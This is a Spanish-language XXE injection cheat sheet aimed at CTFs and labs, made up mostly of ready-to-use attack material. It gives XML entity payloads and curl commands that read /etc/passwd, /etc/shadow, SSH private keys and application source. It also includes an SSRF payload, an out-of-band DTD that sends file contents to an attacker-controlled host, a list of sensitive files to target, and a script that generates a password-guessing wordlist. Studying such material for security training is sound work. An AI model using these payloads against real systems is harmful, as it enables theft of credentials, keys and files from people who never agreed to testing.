# 💉 XXE - XML External Entity Injection

> Vulnerabilidad en parsers XML que permite leer archivos del sistema,
> hacer SSRF, o ejecutar código remoto mediante entidades XML maliciosas.

---

## ⚡ Flujo típico en un CTF / Lab

```
1. Encontrar formulario XML      →  buscar textarea, API, upload
2. Probar XXE básico             →  leer /etc/passwd
3. Analizar output               →  usuarios, contraseñas, claves SSH
4. Escalar                       →  leer archivos sensibles, SSRF, RCE
```

---

## 🔧 Payloads básicos

```bash
# Leer /etc/passwd
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>

# Leer archivo arbitrario
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>

# Leer clave SSH privada
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/usuario/.ssh/id_rsa">]><foo>&xxe;</foo>

# Leer código fuente de la web
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/index.php">]><foo>&xxe;</foo>

# SSRF - acceder a servicios internos
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><foo>&xxe;</foo>
```

---

## 🌐 Enviar payload con curl

```bash
# Método básico
curl -s -X POST http://192.168.0.10 \
  --data-urlencode 'xml=<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'

# Si el servidor es PHP — leer archivos con caracteres especiales en base64
curl -s -X POST http://192.168.0.10 \
  --data-urlencode 'xml=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>'

# Decodificar el base64
echo "BASE64_OUTPUT" | base64 -d
```

---

## ⚠️ Problema con caracteres especiales

Los archivos con `<`, `>`, `&`, `#` rompen el parser XML y devuelven **Parse Error**.

**Solución 1 — PHP filter (si el servidor usa PHP):**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/ruta/archivo">
]>
<foo>&xxe;</foo>
```

**Solución 2 — DTD externo con CDATA:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///ruta/archivo">
  <!ENTITY % dtd SYSTEM "http://TU_IP/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>
```

Con `evil.dtd` en tu servidor:
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://TU_IP/?data=%file;'>">
%all;
```

---

## 🔍 Archivos interesantes a leer

```bash
# Usuarios del sistema
/etc/passwd

# Contraseñas hasheadas (requiere root)
/etc/shadow

# Claves SSH
/home/usuario/.ssh/id_rsa
/home/usuario/.ssh/authorized_keys
/root/.ssh/id_rsa

# Configuración web
/var/www/html/index.php
/var/www/html/config.php
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/sites-enabled/default

# Código fuente de la app
/var/www/html/index.py
/var/www/html/app.py

# Archivos del sistema
/etc/hosts
/etc/hostname
/proc/self/environ    ← variables de entorno del proceso
/proc/self/cmdline    ← comando que lanzó el proceso
```

---

## 💡 Truco clave — campo GECOS en /etc/passwd

El campo GECOS (cuarto campo) normalmente contiene el nombre del usuario.
A veces los CTFs esconden **contraseñas o pistas** ahí:

```
tuf:x:1000:1000:KQNPHFqG**JHcYJossIe:/home/tuf:/bin/bash
                ^^^^^^^^^^^^^^^^^^^
                Campo GECOS — puede contener contraseña parcial
```

Si hay caracteres como `**` — son caracteres redactados que hay que bruteforcear.

**Script Python para generar combinaciones:**
```python
#!/usr/bin/env python3
import string
import itertools

base_pattern = "KQNPHFqG**JHcYJossIe"
possible_chars = string.ascii_letters + string.digits  # 62 chars

passwords = []
for combo in itertools.product(possible_chars, repeat=2):
    new_pass = base_pattern.replace("**", "".join(combo))
    passwords.append(new_pass)

with open("wordlist.txt", "w") as f:
    for pw in passwords:
        f.write(pw + "\n")

print(f"Generadas {len(passwords)} combinaciones")
# 62 * 62 = 3844 combinaciones
```

---

## 🛡️ Cómo detectar si es vulnerable

```bash
# Si devuelve contenido del archivo → vulnerable
# Si devuelve Parse Error o nada → puede ser vulnerable pero con chars especiales
# Si devuelve el XML sin procesar → no vulnerable

# Test rápido con archivo simple
curl -s -X POST http://TARGET \
  --data-urlencode 'xml=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY test SYSTEM "file:///etc/hostname">]><foo>&test;</foo>'
```

---

## ⚠️ Notas importantes

- XXE funciona cuando el parser XML procesa entidades externas sin sanitizar
- PHP SimpleXML y libxml2 son vulnerables por defecto en versiones antiguas
- Parse Error no siempre significa que no es vulnerable — puede ser por caracteres especiales
- Usar `--data-urlencode` en curl para escapar correctamente el payload
- El campo GECOS del `/etc/passwd` es un sitio poco obvio para encontrar pistas en CTFs

---

## 🔗 Referencias

- OWASP XXE: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
- PayloadsAllTheThings XXE: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- HackTricks XXE: https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
